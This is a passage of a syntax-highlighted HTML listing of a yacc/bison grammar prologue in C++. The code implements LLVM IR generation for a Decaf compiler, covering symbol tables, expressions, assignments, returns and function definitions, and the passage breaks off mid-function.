class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafexpr.cc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// print AST?</span></span><br><span class="line"><span class="keyword">bool</span> printAST = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this global variable contains all the generated code</span></span><br><span class="line">llvm::Module *TheModule;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt; symbol_table;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">list</span>&lt;symbol_table &gt; symbol_table_list;</span><br><span class="line">symbol_table symtbl;</span><br><span class="line">symbol_table_list symtblt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is the method used to construct the LLVM intermediate code (IR)</span></span><br><span class="line">llvm::LLVMContext TheContext;</span><br><span class="line">llvm::LLVMContext &amp;Context = TheContext;</span><br><span class="line">llvm::IRBuilder&lt;&gt; Builder(TheContext);</span><br><span class="line"><span class="comment">// the calls to TheContext in the init above and in the</span></span><br><span class="line"><span class="comment">// following code ensures that we are incrementally generating</span></span><br><span class="line"><span class="comment">// instructions in the right order</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dummy main function</span></span><br><span class="line"><span class="comment">// WARNING: this is not how you should implement code generation</span></span><br><span class="line"><span class="comment">// for the main function!</span></span><br><span class="line"><span class="comment">// You should write the codegen for the main method as </span></span><br><span class="line"><span class="comment">// part of the codegen for method declarations (MethodDecl)</span></span><br><span class="line"><span class="keyword">static</span> llvm::Function *TheFunction = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span> get_return;</span><br><span class="line"></span><br><span class="line"><span class="function">descriptor *<span class="title">get_symbolt</span><span class="params">(<span class="built_in">string</span> name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> s:symtblt)&#123;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt;::iterator it;</span><br><span class="line">        <span class="keyword">for</span> (it = s.begin(); it != s.end(); it++) &#123;</span><br><span class="line">            <span class="built_in">string</span> s = it-&gt;first;</span><br><span class="line">            <span class="keyword">if</span>(name == s)</span><br><span class="line">                <span class="keyword">return</span> it-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">descriptor *<span class="title">get_symbol</span><span class="params">(<span class="built_in">string</span> name)</span></span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (it = symtbl.begin(); it != symtbl.end(); it++) &#123;</span><br><span class="line">        <span class="built_in">string</span> s = it-&gt;first;</span><br><span class="line">        <span class="keyword">if</span>(name == s)</span><br><span class="line">            <span class="keyword">return</span> it-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">put_symbolt</span><span class="params">(<span class="built_in">string</span> name, descriptor * des)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(symtblt.front()[name] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        symtblt.front()[name] = des;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">put_symbol</span><span class="params">(<span class="built_in">string</span> name, descriptor * des)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(symtbl[name] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        symtbl[name] = des;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_symbol</span><span class="params">(<span class="built_in">string</span> name, llvmValue k)</span></span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, descriptor* &gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (it = symtbl.begin(); it != symtbl.end(); it++) &#123;</span><br><span class="line">        <span class="built_in">string</span> s = it-&gt;first;</span><br><span class="line">        <span class="keyword">if</span>(name == s &amp;&amp; it-&gt;second-&gt;kind == k)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafBlock::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    symbol_table s;</span><br><span class="line">    symtblt.push_front(s);</span><br><span class="line">    llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != FieldDeclList) &#123;</span><br><span class="line">        val = FieldDeclList-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != StateDeclList) &#123;</span><br><span class="line">        val = StateDeclList-&gt;Codegen();</span><br><span class="line">    &#125; </span><br><span class="line">    symtblt.pop_front();</span><br><span class="line">    <span class="keyword">return</span> val; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafStmt::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dass)&#123;</span><br><span class="line">        decafAssign* s = (decafAssign*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dcall)&#123;</span><br><span class="line">        decafFunCall* s = (decafFunCall*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dblo)&#123;</span><br><span class="line">        decafBlock* s = (decafBlock*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;kind == dret)&#123;</span><br><span class="line">        decafReturn* s = (decafReturn*)<span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafFunCall::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor * des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    llvm::Function * llvm_func = des-&gt;func;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Value *&gt; putsargs;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Type *&gt; putstypes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; arg : llvm_func-&gt;args()) &#123;</span><br><span class="line">        llvm::Type* func_type = arg.getType();</span><br><span class="line">        putstypes.push_back(func_type);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> p:<span class="keyword">this</span>-&gt;get_para())&#123;</span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = (decafBinexp *)p;</span><br><span class="line">        llvm::Value* vt = <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">        llvm::Type* func_type = putstypes[i++];</span><br><span class="line">      </span><br><span class="line">        vt = Builder.CreateZExt(vt, func_type, <span class="string">&quot;zexttmp&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        if(exp-&gt;get_kind() != &quot;VariableExpr&quot;)&#123;</span></span><br><span class="line"><span class="comment">            llvm::ConstantInt* constantInt = llvm::dyn_cast&lt;llvm::ConstantInt&gt;(vt);</span></span><br><span class="line"><span class="comment">            if (constantInt) &#123;</span></span><br><span class="line"><span class="comment">                llvm::APInt apIntValue = constantInt-&gt;getValue();</span></span><br><span class="line"><span class="comment">                int intValue = apIntValue.getZExtValue();</span></span><br><span class="line"><span class="comment">                vt = llvm::ConstantInt::get(func_type, intValue);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125; </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        putsargs.push_back(vt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    llvm::Value *ret_value = Builder.CreateCall(llvm_func, putsargs);</span><br><span class="line">    <span class="keyword">return</span> ret_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafAssign::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    decafBinexp* <span class="built_in">exp</span> = <span class="keyword">this</span>-&gt;get_exp();</span><br><span class="line">    <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    descriptor * des = get_symbolt(<span class="keyword">this</span>-&gt;get_var());</span><br><span class="line">    Builder.CreateStore(<span class="built_in">exp</span>-&gt;des.value,des-&gt;alloc);</span><br><span class="line">    <span class="keyword">return</span> des-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value * <span class="title">decafReturn::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    decafBinexp* <span class="built_in">exp</span> = <span class="keyword">this</span>-&gt;get_exp();</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span>)&#123;</span><br><span class="line">        <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">        Builder.CreateRet(<span class="built_in">exp</span>-&gt;des.value);</span><br><span class="line">        get_return = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exp</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Builder.CreateRetVoid();</span><br><span class="line">        get_return = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafBinexp::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == valueK)&#123;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expuK)&#123;</span><br><span class="line">        llvm::Value *L = Exp1-&gt;Codegen();</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>-&gt;get_op(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> nottmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateNot(L, <span class="string">&quot;nottmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;     </span><br><span class="line">            <span class="keyword">case</span> negtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateNeg(L , <span class="string">&quot;negtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expbK)&#123;</span><br><span class="line">        llvm::Value *L = Exp1-&gt;Codegen();</span><br><span class="line">        llvm::Value *R = Exp2-&gt;Codegen();</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span> || R == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>-&gt;get_op(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> addtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateAdd(L, R, <span class="string">&quot;addtmp&quot;</span>); </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> subtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSub(L, R, <span class="string">&quot;subtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> multmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateMul(L, R, <span class="string">&quot;multmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> remtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSRem(L, R, <span class="string">&quot;remtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> divtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSDiv(L, R, <span class="string">&quot;divtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ortmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateOr(L, R, <span class="string">&quot;ortmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> andtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateAnd(L, R, <span class="string">&quot;andtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> eqtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpEQ(L, R, <span class="string">&quot;eqtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> netmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpNE(L, R, <span class="string">&quot;netmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> slttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSLT(L, R, <span class="string">&quot;slttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> sgttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSGT(L, R, <span class="string">&quot;sgttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> sletmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSLE(L, R, <span class="string">&quot;sletmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> sgetmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSGE(L, R, <span class="string">&quot;sgetmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> shltmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateShl(L, R, <span class="string">&quot;shltmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            <span class="keyword">case</span> shrtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateLShr(L, R, <span class="string">&quot;shrtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;                          </span><br><span class="line">            <span class="keyword">default</span>: </span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == funcK)&#123;</span><br><span class="line">        decafFunCall * call = (decafFunCall *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = call-&gt;Codegen();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafAllexp::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;VariableExpr&quot;</span>)&#123;</span><br><span class="line">        descriptor * des = get_symbolt(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">        llvm::Value* load = Builder.CreateLoad(des-&gt;alloc,<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = load;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;NumberExpr&quot;</span>)&#123;</span><br><span class="line">        <span class="built_in">string</span> s = <span class="keyword">this</span>-&gt;get_name().substr(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        llvm::Value* arg;</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="string">&quot;0x&quot;</span>)&#123;</span><br><span class="line">            arg = llvm::ConstantInt::get(llvm::Type::getInt32Ty(Context), <span class="built_in">std</span>::stoi(<span class="keyword">this</span>-&gt;get_name(),<span class="literal">NULL</span>,<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            arg = llvm::ConstantInt::get(llvm::Type::getInt32Ty(Context), <span class="built_in">std</span>::stoi(<span class="keyword">this</span>-&gt;get_name(),<span class="literal">NULL</span>,<span class="number">10</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = arg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;BoolExpr&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_name() == <span class="string">&quot;True&quot;</span>)&#123;</span><br><span class="line">            llvm::Type* boolType = llvm::Type::getInt1Ty(Context);</span><br><span class="line">            llvm::Constant* trueValue = llvm::ConstantInt::get(boolType, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = trueValue;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_name() == <span class="string">&quot;False&quot;</span>)&#123;</span><br><span class="line">            llvm::Type* boolType = llvm::Type::getInt1Ty(Context);</span><br><span class="line">            llvm::Constant* falseValue = llvm::ConstantInt::get(boolType, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = falseValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;StringConstant&quot;</span>)&#123;</span><br><span class="line">        llvm::GlobalVariable *GS = Builder.CreateGlobalString(<span class="keyword">this</span>-&gt;get_name() ,<span class="string">&quot;globalstring&quot;</span>);</span><br><span class="line">        llvm::Value *stringConst = Builder.CreateConstGEP2_32(GS-&gt;getValueType(), GS, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;cast&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = stringConst;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafVar::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor * des = <span class="keyword">new</span> descriptor();</span><br><span class="line">    <span class="keyword">if</span>(put_symbolt(<span class="keyword">this</span>-&gt;get_name(),des))&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;Alloca = Builder.CreateAlloca(<span class="keyword">this</span>-&gt;lType, <span class="number">0</span>, <span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">        des-&gt;alloc = <span class="keyword">this</span>-&gt;Alloca;</span><br><span class="line">        des-&gt;kind = valueK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Alloca;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafEXFuncDef::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor* des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    <span class="keyword">if</span>(check_symbol( <span class="keyword">this</span>-&gt;get_name(), funcK))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;lfunc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafFuncDef::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor* des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    <span class="keyword">if</span>(check_symbol( <span class="keyword">this</span>-&gt;get_name(), funcK))&#123;</span><br><span class="line">        symbol_table s;</span><br><span class="line">        symtblt.push_front(s);</span><br><span class="line">        get_return = <span class="literal">true</span>;</span><br><span class="line">        llvm::BasicBlock *BB = llvm::BasicBlock::Create(TheContext, <span class="string">&quot;entry&quot;</span>, <span class="keyword">this</span>-&gt;lfunc);</span><br><span class="line">        Builder.SetInsertPoint(BB);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> p:<span class="keyword">this</span>-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;lfunc-&gt;getArg(i)-&gt;setName(p-&gt;get_name());</span><br><span class="line"></span><br><span class="line">            descriptor * des2 = <span class="keyword">new</span> descriptor();</span><br><span class="line">            <span class="keyword">if</span>(put_symbolt(p-&gt;get_name(),des2))&#123;</span><br><span class="line">                des2-&gt;alloc = Builder.CreateAlloca(p-&gt;lType, <span class="number">0</span>, p-&gt;get_name());</span><br><span class="line">                des2-&gt;kind = valueK;</span><br><span class="line">            &#125;</span><br><span class="line">            Builder.CreateStore(<span class="keyword">this</span>-&gt;lfunc-&gt;getArg(i),des2-&gt;alloc);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        decafBlock * B = <span 